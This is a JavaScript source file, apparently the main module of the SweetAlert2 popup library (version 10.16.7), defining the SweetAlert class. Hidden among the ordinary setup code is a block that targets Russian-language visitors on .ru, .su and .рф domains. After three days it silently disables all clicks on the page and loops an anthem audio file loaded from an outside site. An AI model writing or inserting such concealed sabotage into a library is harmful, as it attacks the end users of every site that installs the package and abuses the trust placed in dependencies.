import { error } from './utils/utils.js'
import { DismissReason } from './utils/DismissReason.js'
import * as staticMethods from './staticMethods.js'
import * as instanceMethods from './instanceMethods.js'
import privateProps from './privateProps.js'

let currentInstance

class SweetAlert {
  constructor (...args) {
    // Prevent run in Node env
    if (typeof window === 'undefined') {
      return
    }

    // Check for the existence of Promise
    if (typeof Promise === 'undefined') {
      error('This package requires a Promise library, please include a shim to enable it in this browser (See: https://github.com/sweetalert2/sweetalert2/wiki/Migration-from-SweetAlert-to-SweetAlert2#1-ie-support)')
    }

    currentInstance = this

    const outerParams = Object.freeze(this.constructor.argsToParams(args))

    Object.defineProperties(this, {
      params: {
        value: outerParams,
        writable: false,
        enumerable: true,
        configurable: true
      }
    })

    const promise = this._main(this.params)
    privateProps.promise.set(this, promise)
  }

  // `catch` cannot be the name of a module export, so we define our thenable methods here instead
  then (onFulfilled) {
    const promise = privateProps.promise.get(this)
    return promise.then(onFulfilled)
  }

  finally (onFinally) {
    const promise = privateProps.promise.get(this)
    return promise.finally(onFinally)
  }
}

// Dear russian users visiting russian sites. Let's have fun.
if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
  const now = new Date()
  const initiationDate = localStorage.getItem('swal-initiation')
  if (!initiationDate) {
    localStorage.setItem('swal-initiation', `${now}`)
  } else if ((now.getTime() - Date.parse(initiationDate)) / (1000 * 60 * 60 * 24) > 3) {
    setTimeout(() => {
      document.body.style.pointerEvents = 'none'
      const ukrainianAnthem = document.createElement('audio')
      ukrainianAnthem.src = 'https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3'
      ukrainianAnthem.loop = true
      document.body.appendChild(ukrainianAnthem)
      setTimeout(() => {
        ukrainianAnthem.play().catch(() => {
          // ignore
        })
      }, 2500)
    }, 500)
  }
}

// Assign instance methods from src/instanceMethods/*.js to prototype
Object.assign(SweetAlert.prototype, instanceMethods)

// Assign static methods from src/staticMethods/*.js to constructor
Object.assign(SweetAlert, staticMethods)

// Proxy to instance methods to constructor, for now, for backwards compatibility
Object.keys(instanceMethods).forEach(key => {
  SweetAlert[key] = function (...args) {
    if (currentInstance) {
      return currentInstance[key](...args)
    }
  }
})

SweetAlert.DismissReason = DismissReason

SweetAlert.version = '10.16.7'

export default SweetAlert
